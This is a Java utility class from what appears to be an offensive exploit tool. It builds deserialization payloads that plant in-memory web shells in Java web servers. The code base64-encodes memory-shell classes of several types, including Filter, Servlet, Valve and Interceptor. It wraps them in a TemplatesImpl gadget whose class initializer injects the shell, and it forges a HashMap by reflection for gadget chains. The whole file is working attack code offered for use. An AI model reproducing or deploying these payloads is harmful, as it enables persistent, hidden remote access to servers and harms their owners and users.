package main.utils;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import main.exploit.runner.*;

import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.UUID;

public class ExpUtils {

    public static String getMemShellBase64(String memShellType) throws NotFoundException, IOException, CannotCompileException {
        byte[] bytes, base64;
        if (memShellType.equals("Interceptor")){
            bytes = ClassPool.getDefault().get("memShell.InterceptorShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Filter")){
            bytes = ClassPool.getDefault().get("memShell.FilterShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Controller")){
            bytes = ClassPool.getDefault().get("memShell.ControllerShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Listener")){
            bytes = ClassPool.getDefault().get("memShell.ListenerShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Servlet")){
            bytes = ClassPool.getDefault().get("memShell.ServletShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Upgrade")){
            bytes = ClassPool.getDefault().get("memShell.UpgradeShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else if (memShellType.equals("Valve")){
            bytes = ClassPool.getDefault().get("memShell.ValveShell").toBytecode();
            base64 = Base64.getEncoder().encode(bytes);
            return new String(base64);
        } else {
            return null;
        }
    }

    public static Class<?> getMemShellRunner(String memShellType){
        if (memShellType.equals("Interceptor")){
            return Interceptor.class;
        } else if (memShellType.equals("Filter")){
            return Filter.class;
        } else if (memShellType.equals("Controller")){
            return Controller.class;
        } else if (memShellType.equals("Listener")){
            return Listener.class;
        } else if (memShellType.equals("Servlet")){
            return Servlet.class;
        } else if (memShellType.equals("Upgrade")){
            return Upgrade.class;
        } else if (memShellType.equals("Valve")){
            return Valve.class;
        } else {
            System.out.println("memShell Not Found");
            System.out.println(ShowUtils.showHelp());
            return null;
        }
    }

    public static void setField(Object obj, String name, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl getTemplatesImpl(String memShellType, Class<?> memShellRunner) throws NotFoundException, ClassNotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException {
        String memShellBase64 = ExpUtils.getMemShellBase64(memShellType);
        String code = "{inject(\""+ memShellBase64 +"\");}";
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(memShellRunner.getName());
        clazz.setSuperclass(pool.get(Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet").getName()));
        clazz.makeClassInitializer().insertBefore(code);
        pool.insertClassPath(String.valueOf(AbstractTranslet.class));
        CtClass ctClass = pool.get(memShellRunner.getName());
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        ctClass.makeClassInitializer().insertAfter(code);
        ctClass.setName(UUID.randomUUID().toString().replace('-', '_'));
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl ti = new TemplatesImpl();
        ExpUtils.setField(ti, "_name", "asd");
        ExpUtils.setField(ti, "_bytecodes", new byte[][]{bytes});
        ExpUtils.setField(ti, "_tfactory", new TransformerFactoryImpl());
        return ti;
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        ExpUtils.setField(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        ExpUtils.setField(s, "table", tbl);
        return s;
    }
}
